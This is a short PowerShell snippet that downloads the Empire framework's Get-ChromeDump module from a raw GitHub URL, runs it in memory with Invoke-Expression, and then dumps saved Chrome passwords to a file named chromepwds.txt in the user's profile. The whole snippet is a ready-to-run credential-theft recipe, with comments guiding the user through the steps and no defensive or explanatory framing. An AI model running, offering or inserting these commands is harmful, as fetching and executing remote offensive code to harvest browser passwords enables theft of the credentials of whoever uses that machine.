$url = 'https://raw.githubusercontent.com/adaptivethreat/Empire/master/data/module_source/collection/Get-ChromeDump.ps1'
$code = Invoke-RestMethod -Uri $url -UseBasicParsing
# run the code
Invoke-Expression $code

# now you have a new function called Get-ChromeDump
Get-ChromeDump -OutFile "$env:USERPROFILE\chromepwds.txt"



